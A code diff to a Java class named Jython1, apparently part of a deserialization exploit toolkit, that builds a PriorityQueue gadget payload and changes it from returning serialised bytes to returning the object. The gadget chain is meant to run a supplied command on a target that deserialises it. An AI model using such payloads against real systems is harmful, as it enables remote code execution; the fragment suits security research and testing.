@@ -17,7 +17,7 @@ import java.util.PriorityQueue;
 
 public class Jython1 implements ObjectPayload<PriorityQueue>{
 
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public PriorityQueue getObject(PayloadType type, String... param) throws Exception {
         String command = param[0];
 
         String[] paths = command.split(":");
@@ -71,20 +71,6 @@ public class Jython1 implements ObjectPayload<PriorityQueue>{
         Object[]              queue         = new Object[]{1, 1};
         Reflections.setFieldValue(priorityQueue, "queue", queue);
         Reflections.setFieldValue(priorityQueue, "size", 2);
-
-
-        //序列化
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(priorityQueue);
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
-    }
-
-    @Override
-    public PriorityQueue getObject(String command) throws Exception {
-        return null;
+        return priorityQueue;
     }
 }
